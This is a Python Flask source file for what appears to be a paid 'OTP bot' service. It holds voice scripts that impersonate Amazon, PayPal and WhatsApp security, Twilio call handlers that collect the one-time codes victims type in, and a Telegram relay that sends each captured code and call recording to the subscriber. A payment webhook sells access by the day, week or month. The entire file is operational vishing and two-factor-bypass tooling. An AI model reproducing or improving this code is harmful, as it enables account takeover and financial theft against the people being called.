from flask import Flask, request, jsonify, Response
from threading import Thread
from database import add_subscription_days, get_user_script
from config import bot
from twilio.twiml.voice_response import VoiceResponse, Gather
from logger import send_log, log_error 
import json

app = Flask('')

# ==========================================
# 📜 DEFAULT SCRIPTS
# ==========================================
DEFAULT_SCRIPTS = {
    "amazon": "Hello. This is Amazon Security. We detected a suspicious purchase. Please enter the verification code sent to your mobile device.",
    "paypal": "Hello. This is PayPal Fraud Prevention. A login attempt was made from a new device. Enter your security code to block it.",
    "whatsapp": "Hi. This is WhatsApp Support. Someone is trying to register your number. Enter the verification code on your screen.",
    "default": "Hello. This is an automated security call from {service}. We detected unauthorized activity. Please enter the verification code sent to your mobile."
}

@app.route('/')
def home():
    return "Mussolini OTP Bot - Systems Online."

# ==========================================
# 1. HOODPAY WEBHOOK
# ==========================================
@app.route('/webhook/hoodpay', methods=['POST'])
def hoodpay_webhook():
    try:
        data = request.json
        status = data.get("status", "").upper()
        
        if status in ["COMPLETED", "PAID", "SUCCESS"]:
            metadata = data.get("metadata", {})
            user_id = metadata.get("user_id")
            plan_type = metadata.get("plan_type")
            
            if user_id and plan_type:
                days = 1
                if "weekly" in plan_type: days = 7
                elif "monthly" in plan_type: days = 30
                
                success, new_date = add_subscription_days(user_id, days)
                if success:
                    try:
                        bot.send_message(user_id, f"✅ **Payment Received!**\nPlan `{plan_type}` active.", parse_mode="Markdown")
                    except: pass
                return jsonify({"status": "success"}), 200
        return jsonify({"status": "ignored"}), 200
    except Exception:
        return jsonify({"status": "error"}), 500

# ==========================================
# 2. TWILIO VOICE ENGINE
# ==========================================
@app.route('/twilio/voice', methods=['POST'])
def twilio_voice():
    service_raw = request.args.get('service', 'Security')
    user_id = request.args.get('user_id')
    service_key = service_raw.lower()
    
    # Check Custom Script
    custom_data = get_user_script(user_id, service_key)
    
    if custom_data:
        say_text = custom_data[0]
        language = custom_data[1]
    else:
        language = 'en-US'
        if service_key in DEFAULT_SCRIPTS:
            say_text = DEFAULT_SCRIPTS[service_key]
        else:
            say_text = DEFAULT_SCRIPTS["default"].format(service=service_raw)
    
    resp = VoiceResponse()
    gather = Gather(num_digits=8, action=f'/twilio/gather?user_id={user_id}&service={service_raw}', method='POST', timeout=10)
    gather.say(say_text, voice='alice', language=language)
    resp.append(gather)
    resp.say("No input received. Goodbye.", voice='alice')
    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 3. TWILIO OTP CAPTURE
# ==========================================
@app.route('/twilio/gather', methods=['POST'])
def twilio_gather():
    digits = request.values.get('Digits')
    user_id = request.args.get('user_id')
    service = request.args.get('service')
    resp = VoiceResponse()

    if digits and user_id:
        try:
            bot.send_message(user_id, f"🎹 **OTP CAPTURED!**\n👤 Service: {service}\n🔢 Code: `{digits}`", parse_mode="Markdown")
            send_log(f"OTP Capturado para {user_id}: {digits}", level="SUCCESS")
        except: pass
        resp.say("Thank you. Verified.", voice='alice')
    else:
        resp.say("Invalid input.", voice='alice')

    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 4. TWILIO CALL STATUS (MONITORING)
# ==========================================
@app.route('/twilio/status', methods=['POST'])
def twilio_status():
    """
    Monitors call status (Answered, Completed, Busy) and sends recordings.
    """
    user_id = request.args.get('user_id')
    call_status = request.values.get('CallStatus') # ringing, in-progress, completed, busy, no-answer
    recording_url = request.values.get('RecordingUrl')
    
    if not user_id: return Response("OK", mimetype='text/plain')

    try:
        # 🔔 1. RINGING (Optional log)
        if call_status == 'ringing':
            print(f"User {user_id}: Target phone is ringing...")

        # 🗣️ 2. ANSWERED (IN-PROGRESS)
        elif call_status == 'in-progress':
            bot.send_message(user_id, "👤 **TARGET ANSWERED!**\n_Listening to the bot..._", parse_mode="Markdown")

        # 🔴 3. COMPLETED (Call Ended)
        elif call_status == 'completed':
            msg = "🏁 **Call Ended.**"
            # Attach recording if available
            if recording_url:
                msg += f"\n\n🎙️ **Audio Evidence:** {recording_url}.mp3"
            
            bot.send_message(user_id, msg, parse_mode="Markdown")

        # 🚫 4. FAILED / BUSY
        elif call_status in ['busy', 'no-answer', 'failed', 'canceled']:
            bot.send_message(user_id, f"❌ **Call Failed:** Target status is `{call_status}`.", parse_mode="Markdown")

    except Exception as e:
        print(f"Error sending status: {e}")

    return Response("OK", mimetype='text/plain')

def run():
    app.run(host='0.0.0.0', port=8080)

def start_server():
    t = Thread(target=run)
    t.start()
